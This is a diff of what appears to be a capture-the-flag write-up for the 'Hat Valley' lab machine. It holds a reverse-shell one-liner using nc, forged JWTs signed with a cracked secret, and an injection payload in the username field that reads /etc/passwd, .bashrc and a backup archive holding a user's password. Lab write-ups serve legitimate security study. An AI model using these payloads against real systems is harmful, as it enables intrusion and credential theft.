@@ -73,7 +73,7 @@ if (!doNotTrack) {
   <title>clock</title>
   <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
 </svg>
-          4 min read
+          5 min read
         </div>
       </div>
     </header>
@@ -142,6 +142,7 @@ e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:chris123
 &gt; python3 jwt2john.py &lt;jwt&gt; &gt; jwt.john
 &gt; john --wordlist=/usr/share/wordlists/rockyou.txt jwt.john
 </code></pre><h1 id="foothold">Foothold</h1>
+<h2 id="unintended-aproach-ssti">Unintended aproach: ssti</h2>
 <ul>
 <li>Continue with the /dashboard, there is a tab for creating a leave request</li>
 <li>The leave request <code>reason</code> field is vulnerable to ssti, try create a request with <code>id</code> in the reason field and see the response</li>
@@ -151,8 +152,27 @@ e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:chris123
 <li>Create a request to get a reverse shell</li>
 </ul>
 <pre tabindex="0"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc &lt;ip&gt; 4444 &gt;/tmp/f
+</code></pre><h2 id="intended-approach-jwt-tampering--lfi">Intended approach: jwt tampering + LFI</h2>
+<ul>
+<li>With the previously obtained secret from cracking the jwt, we are able to create jwts at will</li>
+</ul>
+<pre tabindex="0"><code>&gt; python3 -c &#34;import jwt; print(jwt.encode({\&#34;username\&#34;: \&#34;bean.hill\&#34;, \&#34;iat\&#34;:1666598140}, \&#34;123beany123\&#34;, algorithm=\&#34;HS256\&#34;))&#34;
+</code></pre><ul>
+<li>With some exploration, we found that by changing the username field, we are able to retrieve the leave requests for different users. And if it&rsquo;s not a valid user, the server doesn&rsquo;t respond. So, we have a reason to guess that the server side relies on the username field to retrieve the corresponding user&rsquo;s leave requests that are stored in csv formats (can tell from a valid <code>/all-leave</code> response).</li>
+<li>Eventually, we can achieve LFI via a special sequence, this can be utilised to read files from the target system</li>
+</ul>
+<pre tabindex="0"><code>&gt; /&#39; /etc/passwd &#39;test
+&gt; curl http://hat-valley.htb/api/all-leave --cookie &#34;token=&#34;$(python3 -c &#34;import jwt; print(jwt.encode({\&#34;username\&#34;: \&#34;/&#39; /etc/passwd &#39;test\&#34;, \&#34;iat\&#34;:1666598140}, \&#34;123beany123\&#34;, algorithm=\&#34;HS256\&#34;))&#34;)
 </code></pre><h1 id="pe-bean">PE: bean</h1>
 <ul>
+<li>
+<ul>
+<li>By reading the <code>/home/bean/.bashrc</code> file, we leant that there is a backup script: <code>/home/bean/Documents/backup_home.sh</code></li>
+</ul>
+</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl http://hat-valley.htb/api/all-leave --cookie &#34;token=&#34;$(python3 -c &#34;import jwt; print(jwt.encode({\&#34;username\&#34;: \&#34;/&#39; /home/bean/.bashrc &#39;test\&#34;, \&#34;iat\&#34;:1666598140}, \&#34;123beany123\&#34;, algorithm=\&#34;HS256\&#34;))&#34;)
+</code></pre><ul>
 <li>Checkout the script at <code>/home/bean/Documents/backup_home.sh</code></li>
 </ul>
 <pre tabindex="0"><code>#!/bin/bash
@@ -164,8 +184,15 @@ cd /home/bean/Documents/backup_tmp
 tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
 rm -r /home/bean/Documents/backup_tmp
 </code></pre><ul>
-<li>There is a backup file at <code>/home/bean/Documents/backup/bean_backup_final.tar.gz</code></li>
-<li>Transfer this file to local and unzip it, then locate the password of <code>bean</code></li>
+<li>There is a backup file at <code>/home/bean/Documents/backup/bean_backup_final.tar.gz</code>, we can retrieve it</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl http://hat-valley.htb/api/all-leave --cookie &#34;token=&#34;$(python3 -c &#34;import jwt; print(jwt.encode({\&#34;username\&#34;: \&#34;/&#39; /home/bean/Documents/backup/bean_backup_final.tar.gz &#39;test\&#34;, \&#34;iat\&#34;:1666598140}, \&#34;123beany123\&#34;, algorithm=\&#34;HS256\&#34;))&#34;) --output backup.tar.gz
+</code></pre><ul>
+<li>Due to the way we transfer, there will be an extra newline byte at the end of the file making the file unable to be unziped. So, we need to strip out the last newline byte</li>
+</ul>
+<pre tabindex="0"><code>&gt; perl -pi -e &#39;chomp if eof&#39; backup.tar.gz
+</code></pre><ul>
+<li>Now, we can unzip the file and locate the password of <code>bean</code></li>
 </ul>
 <pre tabindex="0"><code>&gt; grep -ri bean
 bean_backup/.config/xpad/content-DS1ZS1:014mrbeanrules!#P
